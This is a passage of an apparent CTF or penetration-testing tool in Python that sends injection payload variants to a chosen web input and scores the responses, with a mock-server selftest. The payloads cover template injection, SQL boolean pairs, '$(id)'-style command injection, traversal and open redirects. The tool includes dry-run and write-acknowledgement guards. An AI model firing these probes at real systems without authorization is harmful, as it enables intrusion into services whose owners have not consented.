
    if args.selftest:
        out = selftest()
        httpkit.jprint(out, args.compact)
        return 0 if out["verdict"] == "PASS" else 1

    selectors = [("param", args.param), ("json", args.json_field),
                 ("form", args.form_field), ("header", args.header_name),
                 ("path", args.path_marker or None)]
    chosen = [name for name, value in selectors if value]
    if len(chosen) != 1:
        parser.error("choose exactly one injection point: --param, --json-field, "
                     "--form-field, --header or --path-marker (got %d)" % len(chosen))
    if not args.url:
        parser.error("--url is required")
    args.kind = chosen[0]
    if args.kind == "path" and args.marker not in args.url:
        parser.error("--path-marker needs the literal %r inside --url" % args.marker)

    families = tuple(f.strip() for f in args.families.split(",") if f.strip())
    unknown = [f for f in families if f not in FAMILIES]
    if unknown:
        parser.error("unknown families: %s (known: %s)"
                     % (", ".join(unknown), ", ".join(FAMILIES)))

    args.method = (args.method or KIND_DEFAULT_METHOD[args.kind]).upper()
    args.base_headers = httpkit.parse_headers(args.extra_header)
    args.base_json = {}
    if args.kind == "json" and args.body:
        try:
            args.base_json = json.loads(args.body)
        except ValueError as exc:
            parser.error("--body is not JSON: %s" % exc)
        if not isinstance(args.base_json, dict):
            parser.error("--body must be a JSON object for --json-field")

    netloc = urllib.parse.urlsplit(args.url).netloc or "target.example"
    cases = build_cases(base=args.base, redirect_host=args.redirect_host,
                        probe_key=args.probe_key, ssrf_port=args.ssrf_port,
                        families=families, target_netloc=netloc)
    plan, skipped, accounting = run_matrix(args, cases)
    expressible_by_family = accounting.pop("_expressible_by_family")

    head = {"mode": "variant-matrix", "target": args.url, "method": args.method,
            "injection_point": {"kind": args.kind,
                                "name": args.param or args.json_field
                                        or args.form_field or args.header_name
                                        or args.marker},
            "base_value": args.base, "families": list(families),
            "ssti_product": SSTI_PRODUCT,
            "skipped": skipped, "follow_redirects": args.follow}
    head.update(accounting)
    if accounting["truncated_by_max_cases"]:
        head["max_cases"] = args.max_cases
        head["truncation_note"] = (
            "TRUNCATED: --max-cases %d withheld %d of the %d expressible shapes, so "
            "every count below covers only the %d that were planned. This is not a "
            "complete sweep of this input point and the negatives are not the "
            "family-level negatives a full run would record."
            % (args.max_cases, accounting["cases_withheld_by_max_cases"],
               accounting["cases_expressible"], accounting["cases_planned"]))

    if args.dry_run:
        # Deliberately BEFORE the write check: inspecting a write matrix without
        # firing it is exactly when that inspection is worth most.
        head.update({
            "dry_run": True, "requests_sent": 0,
            "write_ack_required": args.method in WRITE_METHODS,
            "write_ack_given": args.write_ack,
            "matrix": [entry for _, entry in plan],
            "note": "nothing was sent; drop --dry-run to fire the matrix",
        })
        httpkit.jprint(head, args.compact)
        return 0

    if args.method in WRITE_METHODS and not args.write_ack:
        head.update({
            "ok": False, "refused": True, "requests_sent": 0,
            "phase": "write-shaped matrix refused before the baseline",
            "reason": "write-shaped probe: read blast_radius on the matching chain "
                      "card and test on an object you created, then pass --write-ack",
            "note": "nothing was sent; %d cases would have used %s. Prefer a "
                    "read-only oracle: omit the fields that cause a write and read "
                    "what the endpoint returns. --dry-run prints the matrix without "
                    "sending it." % (len(plan), args.method),
        })
        httpkit.jprint(head, args.compact)
        return 2

    started = time.monotonic()
    base = baseline_request(args)
    if not base["ok"]:
        head.update({"ok": False, "requests_sent": 1, "baseline": base,
                     "phase": "baseline failed at the transport layer",
                     "reason": "every case would be scored against nothing; fix "
                               "reachability before spending the matrix",
                     "note": "a transport failure is evidence about availability, "
                             "never about a bug class"})
        httpkit.jprint(head, args.compact)
        return 1

    results, transport_failures = [], 0
    for index, (case, entry) in enumerate(plan):
        if args.delay and index:
            time.sleep(args.delay)
        resp = httpkit.request(entry["url"], args.method, entry["headers"],
                               entry["body"], timeout=args.timeout,
                               follow=args.follow)
        needle = case["value"] if case["value"] else case["payload_repr"]
        points, reasons, marker, snippet, source = score_case(case, resp, base, args,
                                                             needle)
        record = dict(entry)
        record.pop("headers", None)          # already in the request line
        record.update({
            "ok": resp["ok"], "status": resp.get("status"),
            "length": resp.get("length"), "elapsed": resp.get("elapsed"),
            "signature": httpkit.body_signature(resp.get("body", ""))
                         if resp["ok"] else None,
            "location": resp["headers"].get("Location") if resp["ok"] else None,
            "result": ("HTTP %s, %d bytes, %.3fs"
                       % (resp["status"], resp["length"], resp["elapsed"]))
                      if resp["ok"] else
                      ("transport failure: %s (%.3fs)"
                       % (resp.get("error"), resp["elapsed"])),
            "score": points, "diverged": points > 0,
            "divergence_reasons": reasons, "marker": marker,
        })
        if resp["ok"]:
            record["excerpt"] = snippet
            record.update(verify_excerpt(snippet, marker, source, resp))
        else:
            transport_failures += 1
            record["transport"] = True
        results.append(record)

    diverged = [r for r in results if r["diverged"]]
    negatives = [r for r in results if r["ok"] and not r["diverged"]]
    ranked = sorted(diverged, key=lambda r: (-r["score"], r["id"]))
    engines = sorted({r["engine_implied"] for r in diverged
                      if r["family"] == "ssti-arith" and r.get("engine_implied")})
    reflected = sum(1 for r in results
                    if any("reflected" in reason for reason in r["divergence_reasons"]))

    head.update({
        "ok": True, "dry_run": False, "baseline": base,
        "requests_sent": 1 + len(results), "cases_sent": len(results),
        "diverged_count": len(diverged), "transport_failures": transport_failures,
        "negatives_proved": len(negatives),
        "negatives_summary": "%d of %d shapes sent produced no divergence at this "
                             "input point and are ruled out for it"
                             % (len(negatives), len(results)),
        # "fully negative" has to mean every expressible shape in that family was
        # actually sent and none of them reacted. On a --max-cases run a family
        # whose remaining shapes were withheld is NOT closed, and saying so would
        # be a false negative the next session would trust.
        "families_fully_negative": sorted(
            {f for f in {r["family"] for r in results}
             if not any(r["diverged"] for r in results if r["family"] == f)
             and sum(1 for r in results if r["family"] == f)
                 == expressible_by_family.get(f, 0)}),
        "families_partially_sent": sorted(
            {f for f in {r["family"] for r in results}
             if sum(1 for r in results if r["family"] == f)
                 != expressible_by_family.get(f, 0)}),
        "elapsed": round(time.monotonic() - started, 3),
        "boolean_pairs": boolean_pairs(results),
        "ranked": [{k: r[k] for k in ("id", "family", "shape", "payload_repr",
                                      "class", "candidate_classes", "score",
                                      "result", "divergence_reasons", "marker")}
                   for r in ranked[:args.top]],
        "cases": results,
    })
    if engines:
        head["engine_implied"] = engines
    if reflected and reflected >= max(3, len(results) // 2):
        head["reflection_caution"] = (
            "%d of %d cases reflected their payload: this endpoint echoes its "
            "input, so reflection is not discriminating here" % (reflected, len(results)))
    head["post_probe"] = (post_probe_command(args, ranked[0]) if ranked else
                          {"verdict": "inconclusive",
                           "note": "0 of %d shapes diverged; record the negative "
                                   "and change mechanism layer, not payload syntax"
                                   % len(results)})
    head["discipline"] = [
        "A divergence names the layer to open; only a marker hit is class-level "
        "evidence, and neither is impact.",
        "The negatives are the durable result: quote negatives_summary in the "
        "ledger so the next session does not re-walk these shapes.",
        "Every verdict still goes through tools/hooks.py post-probe.",
    ]
    httpkit.jprint(head, args.compact)
    return 0


# ------------------------------------------------------------------- selftest
# A mock target that is byte-identical for every payload except the ONE the check
# under test cares about: any reflection would make every case diverge and prove
# nothing about the scorer.

INERT = b"<html><body><p>no result for that term</p></body></html>"
SSTI_BODY = ("<html><body><p>total: %d</p></body></html>" % SSTI_PRODUCT).encode()
# The TRUE member of a boolean pair returns a different length; nothing else about
# the response changes, which is the shape boolean_pairs exists to read.
BOOL_TRUE_BODY = b"<html><body><p>three rows matched that term exactly</p></body></html>"
# A marker fires, but the text around it reads as a dead upstream: hooks.py refuses
# a timeout as a confirmation, so NEVER_CONFIRMATIONS has to downgrade it here too.
TARPIT_BODY = b"upstream connection reset while reading; uid=0(root) gid=0(root)"


class _Mock(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):
        pass

    def handle_one_request(self):
        # /drop closes the socket mid-request on purpose; without this the server
        # thread prints a traceback that has nothing to do with the assertions.
        try:
            BaseHTTPRequestHandler.handle_one_request(self)
        except Exception:
            self.close_connection = True

    def handle_error(self, *args):
        pass

    def _send(self, body, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _value(self):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        return parsed.path, (query.get("q") or [""])[0]

    def do_GET(self):
        path, value = self._value()
        if path == "/redir":
            # a naive open redirect: the parameter goes straight into Location, so
            # the ONLY proof of the class is in a header and not in the body
            body = b"redirecting"
            self.send_response(302)
            self.send_header("Location", value or "/home")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            return self.wfile.write(body)
        if path == "/inert":
            if value == "{{%d*%d}}" % (SSTI_A, SSTI_B):
                return self._send(SSTI_BODY)
            return self._send(INERT)
        if path == "/drop":
            if "\x00" in value:
                self.close_connection = True
                try:
                    self.connection.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                self.connection.close()
                return
            return self._send(INERT)
        if path == "/slow":
            if "$(id)" in value:
                time.sleep(0.9)
            return self._send(INERT)
        if path == "/bool":
            # only the TRUE members of the three boolean pairs carry " OR "
            return self._send(BOOL_TRUE_BODY if " OR " in value else INERT)
        if path == "/tarpit":
            reacts = value.endswith("id") or "$(id)" in value or "`id`" in value
            return self._send(TARPIT_BODY if reacts else INERT)
        return self._send(b"no route", 404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        self.rfile.read(length)
        return self._send(INERT)


def _run_cli(argv):
    """Call main() in-process and capture the JSON it printed, like the CLI does.

    stderr is captured too: argparse writes its refusals there, so a check on the
    one-injection-point rule has nowhere else to read the message from. An
    unexpected exception becomes code 1 with _exception rather than tearing down
    the selftest, so a mutation that crashes main() is reported as a FAIL.
    """
    import io
    buffer, errbuf = io.StringIO(), io.StringIO()
    real_out, real_err = sys.stdout, sys.stderr
    sys.stdout, sys.stderr = buffer, errbuf
    exception = None
    try:
        code = main(argv)
    except SystemExit as exc:                        # argparse.error
        code = exc.code if isinstance(exc.code, int) else 2
    except Exception as exc:                         # a mutation that crashes
        code, exception = 1, "%s: %s" % (type(exc).__name__, exc)
    finally:
        sys.stdout, sys.stderr = real_out, real_err
    raw, err = buffer.getvalue(), errbuf.getvalue()
    try:
        out = json.loads(raw)
    except ValueError:
        out = {"_unparsed_stdout": raw[:800]}
    if not isinstance(out, dict):
        out = {"_unparsed_stdout": raw[:800]}
    # argparse prints "usage: ...\nprog: error: <message>"; the tail is the part a
    # check cares about, and _stderr_error isolates the message from the banner so
    # an assertion on the wording cannot be satisfied by the usage line instead.
    out["_stderr"] = err[-800:]
    out["_stderr_error"] = err.split("error: ", 1)[1].strip() if "error: " in err else ""
    if exception:
        out["_exception"] = exception
    return code, out


def selftest():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Mock)
    base_url = "http://127.0.0.1:%d" % server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    checks = []

    def check(name, ok, detail, extra=None):
        entry = {"name": name, "pass": bool(ok), "detail": detail}
        if extra is not None and not ok:
            entry["output"] = extra
        checks.append(entry)

    try:
        # (a) the matrix itself: exact counts per selector, every payload usable
        code, dry = _run_cli(["--url", base_url + "/inert", "--json-field",
                              "user.name", "--base", "ctfv2", "--dry-run",
                              "--compact"])
        reprs = [c["payload_repr"] for c in dry.get("matrix", [])]
        check("dry-run json-field: all 50 shapes expressible, nothing sent",
              code == 0 and dry.get("cases_expressible") == 50
              and dry.get("cases_skipped") == 0 and dry.get("requests_sent") == 0,
              "exit=%s expressible=%s skipped=%s sent=%s"
              % (code, dry.get("cases_expressible"), dry.get("cases_skipped"),
                 dry.get("requests_sent")), dry)
        check("dry-run: every payload_repr non-empty and distinct",
              len(reprs) == 50 and all(r.strip() for r in reprs)
              and len(set(reprs)) == 50,
              "%d reprs, %d distinct, %d empty"
              % (len(reprs), len(set(reprs)), sum(1 for r in reprs if not r.strip())),
              sorted(r for r in reprs if reprs.count(r) > 1))
        engines = [c.get("engine_implied") for c in dry.get("matrix", [])
                   if c["family"] == "ssti-arith"]
        check("dry-run: every ssti case names the engine it implies",
              len(engines) == 6 and all(engines) and len(set(engines)) == 6,
              "%d ssti cases, %d distinct engines" % (len(engines), len(set(engines))),
              engines)

        code, dry_param = _run_cli(["--url", base_url + "/inert", "--param", "q",
                                    "--base", "ctfv2", "--dry-run", "--compact"])
        skipped_families = sorted({s["family"] for s in dry_param.get("skipped", [])})
        check("dry-run query param: 48 expressible, the 2 JSON-only shapes skipped "
              "with a reason",
              code == 0 and dry_param.get("cases_expressible") == 48
              and dry_param.get("cases_skipped") == 2
              and skipped_families == ["proto-pollution"]
              and all("JSON" in s["skipped_because"]
                      for s in dry_param.get("skipped", [])),
              "expressible=%s skipped=%s families=%s"
              % (dry_param.get("cases_expressible"), dry_param.get("cases_skipped"),
                 skipped_families), dry_param.get("skipped"))
        # the encoded-traversal cases must reach the wire with their '%' intact,
        # or the tool measures %252e when it claims to measure %2e
        encoded = [c for c in dry_param.get("matrix", [])
                   if c["shape"] == "percent-encoded"]
        check("dry-run: a pre-encoded payload is not re-quoted into the URL",
              len(encoded) == 1 and "q=%2e%2e%2f" in encoded[0]["url"]
              and "%252e" not in encoded[0]["url"],
              encoded[0]["url"] if encoded else "case missing", encoded)

        code, dry_header = _run_cli(["--url", base_url + "/inert", "--header",
                                     "X-Forwarded-For", "--base", "ctfv2",
                                     "--dry-run", "--compact"])
        check("dry-run header: 40 expressible, 9 container shapes plus the 1 shape "
              "the transport cannot carry skipped",
              code == 0 and dry_header.get("cases_expressible") == 40
              and dry_header.get("cases_skipped") == 10,
              "expressible=%s skipped=%s" % (dry_header.get("cases_expressible"),
                                             dry_header.get("cases_skipped")),
              dry_header)
        # cmdi/newline dies in http.client before a byte leaves, so counting it as
        # header-expressible both overstates the matrix and spends a request on a
        # guaranteed ValueError. Measured against a local listener:
        #   ValueError: Invalid header value b'ctfv2\nid'
        nl_skip = [s for s in dry_header.get("skipped", [])
                   if s["shape"] == "newline"]
        nl_sent = [c for c in dry_header.get("matrix", []) if c["shape"] == "newline"]
        check("dry-run header: the bare-newline shape is skipped with the transport "
              "reason instead of being planned as a request",
              len(nl_skip) == 1 and not nl_sent
              and "CR or LF" in nl_skip[0]["skipped_because"]
              and "never reaches the wire" in nl_skip[0]["skipped_because"],
              "skipped=%s planned=%d" % (nl_skip[0]["skipped_because"][:90]
                                         if nl_skip else None, len(nl_sent)),
              dry_header.get("skipped"))
        # the same shape through a query param IS expressible: urlencode carries it
        nl_param = [c for c in dry_param.get("matrix", []) if c["shape"] == "newline"]
        check("the transport gate is per-selector: the newline shape stays "
              "expressible through --param",
              len(nl_param) == 1 and "%0A" in nl_param[0]["url"].upper(),
              nl_param[0]["url"] if nl_param else "case missing", nl_param)

        # (a2) --max-cases must not rewrite the accounting. The headline product of
        # this tool is "48 shapes, 47 negatives"; a cap that renamed 48 to 3 would
        # understate the matrix and the negatives recorded against it.
        check("an untruncated run reports truncated_by_max_cases false and plans "
              "every expressible shape",
              dry_param.get("truncated_by_max_cases") is False
              and dry_param.get("cases_planned") == 48
              and dry_param.get("cases_withheld_by_max_cases") == 0
              and dry_param.get("truncation_note") is None,
              "planned=%s truncated=%s withheld=%s"
              % (dry_param.get("cases_planned"),
                 dry_param.get("truncated_by_max_cases"),
                 dry_param.get("cases_withheld_by_max_cases")), dry_param)
        code, capped = _run_cli(["--url", base_url + "/inert", "--param", "q",
                                 "--base", "ctfv2", "--max-cases", "3",
                                 "--dry-run", "--compact"])
        check("--max-cases 3 still reports 50 generated and 48 expressible, says it "
              "truncated, and names the 45 shapes it withheld",
              code == 0 and capped.get("cases_generated") == 50
              and capped.get("cases_expressible") == 48
              and capped.get("cases_skipped") == 2
              and capped.get("cases_planned") == 3
              and capped.get("truncated_by_max_cases") is True
              and capped.get("cases_withheld_by_max_cases") == 45
              and "TRUNCATED" in (capped.get("truncation_note") or "")
              and len(capped.get("matrix", [])) == 3,
              "generated=%s expressible=%s planned=%s withheld=%s truncated=%s"
              % (capped.get("cases_generated"), capped.get("cases_expressible"),
                 capped.get("cases_planned"),
                 capped.get("cases_withheld_by_max_cases"),
                 capped.get("truncated_by_max_cases")), capped)
        # and a family whose remaining shapes were withheld is NOT a closed layer
        code, part = _run_cli(["--url", base_url + "/inert", "--param", "q",
                               "--base", "ctfv2", "--families", "traversal",
                               "--max-cases", "2", "--compact"])
        check("a truncated family is reported as partially sent, never as fully "
              "negative",
              code == 0 and part.get("cases_sent") == 2
              and part.get("negatives_proved") == 2
              and part.get("families_fully_negative") == []
              and part.get("families_partially_sent") == ["traversal"],
              "sent=%s fully_negative=%s partially_sent=%s"
              % (part.get("cases_sent"), part.get("families_fully_negative"),
                 part.get("families_partially_sent")), part)

        # (b) live: one family reacts, the rest are countable negatives
        code, live = _run_cli(["--url", base_url + "/inert", "--param", "q",
                               "--base", "ctfv2", "--challenge",
                               "selftest-not-written", "--hypothesis-id", "h1",
                               "--compact"])
        top = (live.get("ranked") or [{}])[0]
        check("live: exactly 1 of 48 cases diverges, 47 negatives proved",
              code == 0 and live.get("diverged_count") == 1
              and live.get("cases_sent") == 48
              and live.get("negatives_proved") == 47
              and live.get("requests_sent") == 49,
              "diverged=%s sent=%s negatives=%s requests=%s"
              % (live.get("diverged_count"), live.get("cases_sent"),
                 live.get("negatives_proved"), live.get("requests_sent")), live)
        check("live: the diverged case is the double-brace ssti shape and the "
              "engine is named",
              top.get("family") == "ssti-arith" and top.get("shape") == "double-brace"
              and live.get("engine_implied") == ["Jinja2 / Twig / Nunjucks / Liquid family"]
              and top.get("marker") == str(SSTI_PRODUCT),
              "top=%s/%s engines=%s marker=%s"
              % (top.get("family"), top.get("shape"), live.get("engine_implied"),
                 top.get("marker")), top)
        post = live.get("post_probe", {})
        excerpt_ok = [c for c in live.get("cases", []) if c["id"] == top.get("id")]
        check("live: the hooks.py line quotes a verbatim excerpt that CONTAINS the "
              "marker, and is ready to run",
              post.get("verdict") == "confirms"
              and post.get("ready_to_run") is True
              and "--evidence-kind class" in post.get("command", "")
              and excerpt_ok and excerpt_ok[0]["excerpt_is_verbatim"] is True
              and excerpt_ok[0]["marker_in_excerpt"] is True
              and post.get("evidence_contains_marker") is True
              and str(SSTI_PRODUCT) in excerpt_ok[0]["excerpt"],
              post.get("command", "")[:160], post)
        # 8, not 10: proto-pollution was never sent through a query param, and an
        # unsent family is not a proved negative.
        check("live: the 8 sent families that did not react are listed as negative",
              sorted(live.get("families_fully_negative") or []) ==
              sorted(f for f in FAMILIES if f not in ("ssti-arith", "proto-pollution")),
              str(live.get("families_fully_negative")), live.get("families_fully_negative"))

        # (c) a write-shaped matrix is refused before anything is sent
        code, refused = _run_cli(["--url", base_url + "/inert", "--json-field",
                                  "user.name", "--base", "ctfv2", "--compact"])
        check("write-shaped run without --write-ack is refused, 0 requests sent",
              code == 2 and refused.get("refused") is True
              and refused.get("requests_sent") == 0
              and "blast_radius" in refused.get("reason", "")
              and "--write-ack" in refused.get("reason", ""),
              "exit=%s reason=%s" % (code, refused.get("reason")), refused)
        code, allowed = _run_cli(["--url", base_url + "/inert", "--json-field",
                                  "user.name", "--base", "ctfv2", "--write-ack",
                                  "--families", "nosql-operator", "--compact"])
        check("the same run with --write-ack proceeds and sends the 4 operator shapes",
              code == 0 and allowed.get("cases_sent") == 4
              and allowed.get("refused") is None,
              "exit=%s sent=%s" % (code, allowed.get("cases_sent")), allowed)

        # (d) a transport failure is a transport result, never a divergence
        code, dropped = _run_cli(["--url", base_url + "/drop", "--param", "q",
                                  "--base", "ctfv2", "--families", "traversal",
                                  "--compact"])
        dead = [c for c in dropped.get("cases", []) if c.get("transport")]
        check("a dropped connection is recorded as transport and scores no divergence",
              code == 0 and dropped.get("transport_failures") == 1
              and dropped.get("diverged_count") == 0
              and dropped.get("negatives_proved") == 5
              and len(dead) == 1 and dead[0]["shape"] == "nul-suffixed"
              and dead[0]["diverged"] is False and dead[0]["score"] == 0
              and dead[0].get("marker") is None,
              "transport=%s diverged=%s negatives=%s case=%s"
              % (dropped.get("transport_failures"), dropped.get("diverged_count"),
                 dropped.get("negatives_proved"),
                 dead[0]["result"] if dead else None), dropped)
        check("with nothing diverged the post_probe stays inconclusive and names "
              "the count",
              dropped.get("post_probe", {}).get("verdict") == "inconclusive"
              and "0 of 6" in dropped.get("post_probe", {}).get("note", ""),
              dropped.get("post_probe", {}).get("note"), dropped.get("post_probe"))

        # a blind sleep leaves the body untouched: timing has to carry it alone
        code, slow = _run_cli(["--url", base_url + "/slow", "--param", "q",
                               "--base", "ctfv2", "--families", "cmdi",
                               "--timing-floor", "0.4", "--compact"])
        slow_top = (slow.get("ranked") or [{}])[0]
        check("a sleeping response is flagged as a timing outlier and nothing else is",
              code == 0 and slow.get("diverged_count") == 1
              and slow_top.get("shape") == "dollar-paren-subshell"
              and any("timing outlier" in r
                      for r in slow_top.get("divergence_reasons", [])),
              "diverged=%s top=%s reasons=%s"
              % (slow.get("diverged_count"), slow_top.get("shape"),
                 slow_top.get("divergence_reasons")), slow)
        # The NOT-X direction of "only a marker hit may confirm": this case diverged
        # on timing with an INERT body, so there is no marker and the verdict must
        # stay inconclusive with evidence_kind surface. Without this, replacing the
        # rule with `verdict = "confirms"` changes nothing the selftest can see.
        slow_post = slow.get("post_probe", {})
        slow_case = [c for c in slow.get("cases", [])
                     if c["shape"] == "dollar-paren-subshell"]
        check("a divergence with no marker cannot confirm: verdict inconclusive, "
              "evidence_kind surface, and --evidence-kind surface in the command",
              slow_case and slow_case[0].get("marker") is None
              and slow_post.get("verdict") == "inconclusive"
              and slow_post.get("evidence_kind") == "surface"
              and "--evidence-kind surface" in slow_post.get("command", "")
              and "--verdict inconclusive" in slow_post.get("command", "")
              and "no marker fired" in slow_post.get("note", "")
              # the rule has to record its own refusal, or its removal is invisible
              and any("no marker fired" in d
                      for d in slow_post.get("downgrades", [])),
              "marker=%s verdict=%s kind=%s downgrades=%s"
              % (slow_case[0].get("marker") if slow_case else "case missing",
                 slow_post.get("verdict"), slow_post.get("evidence_kind"),
                 slow_post.get("downgrades")), slow_post)
        # and the same rule pinned directly, away from the live target: a markerless
        # top case can never produce a confirms however good its excerpt looks
        clean_top = {"request": "GET /x", "result": "HTTP 200, 56 bytes, 0.920s",
                     "class": "web-command-injection", "marker": None,
                     "excerpt": "a long, clean, entirely verbatim body excerpt",
                     "excerpt_source": "body", "excerpt_is_verbatim": True,
                     "marker_in_excerpt": None}
        clean_post = post_probe_command(
            argparse.Namespace(challenge="c", hypothesis_id="h", probe_class=None),
            clean_top)
        check("post_probe_command refuses a confirms for a markerless top case even "
              "with a clean verbatim excerpt, and names the refusal",
              clean_post["verdict"] == "inconclusive"
              and clean_post["evidence_kind"] == "surface"
              and any("no marker fired" in d for d in clean_post["downgrades"]),
              "verdict=%s downgrades=%s" % (clean_post["verdict"],
                                            clean_post["downgrades"]), clean_post)
        # this run passed no --challenge/--hypothesis-id, so the line is NOT runnable
        check("without --challenge and --hypothesis-id the line is not ready to run "
              "and carries the placeholders",
              slow_post.get("ready_to_run") is False
              and "<challenge>" in slow_post.get("command", "")
              and "<hypothesis-id>" in slow_post.get("command", ""),
              "ready_to_run=%s cmd=%s" % (slow_post.get("ready_to_run"),
                                          slow_post.get("command", "")[:120]),
              slow_post)
        # the absolute floor, not the ratio, is what keeps loopback jitter out: the
        # same 0.9s sleep must NOT be a finding once the floor is above it
        code, slow_hi = _run_cli(["--url", base_url + "/slow", "--param", "q",
                                  "--base", "ctfv2", "--families", "cmdi",
                                  "--timing-floor", "5.0", "--compact"])
        check("--timing-floor is an absolute gate: a 0.9s sleep is no outlier when "
              "the floor is 5.0s, even though the ratio is huge",
              code == 0 and slow_hi.get("diverged_count") == 0
              and slow_hi.get("negatives_proved") == 6
              and not any("timing outlier" in r for c in slow_hi.get("cases", [])
                          for r in c.get("divergence_reasons", [])),
              "diverged=%s negatives=%s" % (slow_hi.get("diverged_count"),
                                            slow_hi.get("negatives_proved")), slow_hi)

        # a marker fires but the text around it reads as a dead upstream: hooks.py
        # refuses a timeout as a confirmation, so this must be downgraded here
        code, tarpit = _run_cli(["--url", base_url + "/tarpit", "--param", "q",
                                 "--base", "ctfv2", "--families", "cmdi",
                                 "--challenge", "selftest-not-written",
                                 "--hypothesis-id", "h3", "--compact"])
        tpost = tarpit.get("post_probe", {})
        ttop = (tarpit.get("ranked") or [{}])[0]
        check("a marker wrapped in dead-connection text is downgraded from confirms "
              "and the downgrade says why",
              code == 0 and ttop.get("marker") == "uid="
              and tpost.get("verdict") == "inconclusive"
              and tpost.get("evidence_kind") == "surface"
              and any("timeout or a dead connection" in d
                      for d in tpost.get("downgrades", [])),
              "marker=%s verdict=%s downgrades=%s"
              % (ttop.get("marker"), tpost.get("verdict"),
                 tpost.get("downgrades")), tpost)

        # boolean SQLi: the pair members are compared with each other, and the
        # comparison has to be able to come out BOTH ways
        code, boolt = _run_cli(["--url", base_url + "/bool", "--param", "q",
                                "--base", "ctfv2", "--families", "sql-boolean",
                                "--compact"])
        bpairs = boolt.get("boolean_pairs") or []
        check("boolean_pairs: all three TRUE members differ from their FALSE member "
              "when the app is boolean-sensitive",
              code == 0 and len(bpairs) == 3
              and all(p.get("comparable") is True and p.get("differs") is True
                      for p in bpairs)
              and sorted(p["pair"] for p in bpairs) == ["double-quote", "numeric",
                                                        "single-quote"]
              and all(p.get("true_result") != p.get("false_result") for p in bpairs),
              str(bpairs), boolt)
        live_pairs = live.get("boolean_pairs") or []
        check("boolean_pairs: the same three pairs report differs false against an "
              "app that ignores the payload",
              len(live_pairs) == 3
              and all(p.get("comparable") is True and p.get("differs") is False
                      for p in live_pairs),
              str(live_pairs), live_pairs)

        # a class whose only proof is a header must be quoted FROM the header
        code, redir = _run_cli(["--url", base_url + "/redir?q=/home", "--param", "q",
                               "--base", "/home", "--challenge",
                               "selftest-not-written", "--hypothesis-id", "h2",
                               "--families", "redirect", "--compact"])
        rtop = [c for c in redir.get("cases", []) if c["shape"] == "absolute-external"]
        rpost = redir.get("post_probe", {})
        check("a header-only marker is quoted from the header, not from the body",
              code == 0 and redir.get("diverged_count") == 4
              and len(rtop) == 1 and rtop[0]["excerpt_source"] == "headers"
              and "evil.example" in rtop[0]["excerpt"]
              and rtop[0]["excerpt_is_verbatim"] is True
              and rpost.get("verdict") == "confirms"
              and rpost.get("evidence_source") == "headers"
              and "evil.example" in rpost.get("command", ""),
              "source=%s excerpt=%r"
              % (rtop[0]["excerpt_source"] if rtop else None,
                 rtop[0]["excerpt"] if rtop else None), redir)

        # (e) the excerpt verifier, in the direction that can actually be False.
        # `snippet in body or snippet in header_blob(resp)` was a value compared
        # with itself, so it could never be False and hardcoding it True changed
        # nothing. These four cases pin both fields to what they claim to mean.
        fake = {"body": "total: 50847899 rows", "headers": {"Location": "/home"},
                "headers_all": [["Location", "/home"]]}
        good = verify_excerpt("total: 50847899", "50847899", "body", fake)
        fabricated = verify_excerpt("total: 11111111", "11111111", "body", fake)
        missing = verify_excerpt("total: ", "50847899", "body", fake)
        mis_sourced = verify_excerpt("total: 50847899", "50847899", "headers", fake)
        empty = verify_excerpt("", "50847899", "body", fake)
        check("verify_excerpt: a real quote passes both fields",
              good["excerpt_is_verbatim"] is True
              and good["marker_in_excerpt"] is True,
              str(good))
        check("verify_excerpt: a quote that is not in the response is NOT verbatim",
              fabricated["excerpt_is_verbatim"] is False and empty
              ["excerpt_is_verbatim"] is False,
              "fabricated=%s empty=%s" % (fabricated["excerpt_is_verbatim"],
                                          empty["excerpt_is_verbatim"]),
              [fabricated, empty])
        check("verify_excerpt: a quote taken from the body while the source says "
              "headers is NOT verbatim",
              mis_sourced["excerpt_is_verbatim"] is False,
              str(mis_sourced), mis_sourced)
        check("verify_excerpt: a verbatim quote that omits the marker reports "
              "marker_in_excerpt false",
              missing["excerpt_is_verbatim"] is True
              and missing["marker_in_excerpt"] is False,
              str(missing), missing)
        # and the rule that makes those fields matter: an excerpt without the marker
        # must never be handed to hooks.py as --evidence for a confirms
        fake_args = argparse.Namespace(challenge="selftest-not-written",
                                       hypothesis_id="h9", probe_class=None)
        bad_top = {"request": "GET /x", "result": "HTTP 302, 11 bytes, 0.001s",
                   "class": "web-open-redirect", "marker": "evil.example",
                   "excerpt": "redirecting", "excerpt_source": "body",
                   "excerpt_is_verbatim": True, "marker_in_excerpt": False}
        bad_post = post_probe_command(fake_args, bad_top)
        check("a marker hit whose excerpt does not contain the marker is refused as "
              "a confirms, with the reason named",
              bad_post["verdict"] == "inconclusive"
              and bad_post["evidence_kind"] == "surface"
              and bad_post["evidence_contains_marker"] is False
              and any("does not contain the marker" in d
                      for d in bad_post["downgrades"])
              and "--verdict inconclusive" in bad_post["command"],
              "verdict=%s downgrades=%s" % (bad_post["verdict"],
                                            bad_post["downgrades"]), bad_post)
        worse_top = dict(bad_top, marker_in_excerpt=True,
                         excerpt_is_verbatim=False)
        worse_post = post_probe_command(fake_args, worse_top)
        check("an excerpt that is not verbatim in the source it names is refused as "
              "a confirms too",
              worse_post["verdict"] == "inconclusive"
              and any("not a verbatim substring" in d
                      for d in worse_post["downgrades"]),
              "verdict=%s downgrades=%s" % (worse_post["verdict"],
                                            worse_post["downgrades"]), worse_post)

        # (f) a marker in a REPEATED header. httpkit's collapsed `headers` keeps the
        # last value only, so a marker in the first of three Set-Cookie headers was
        # invisible; headers_all is what makes it findable.
        multi = {"ok": True, "status": 200, "length": 10, "elapsed": 0.01,
                 "body": "no result",
                 "headers": {"Set-Cookie": "third=3", "Content-Type": "text/html"},
                 "headers_all": [["Set-Cookie", "first=ctfv2mark"],
                                 ["Set-Cookie", "second=2"],
                                 ["Set-Cookie", "third=3"],
                                 ["Content-Type", "text/html"]]}
        base_rec = {"status": 200, "length": 10, "elapsed": 0.01, "location": None,
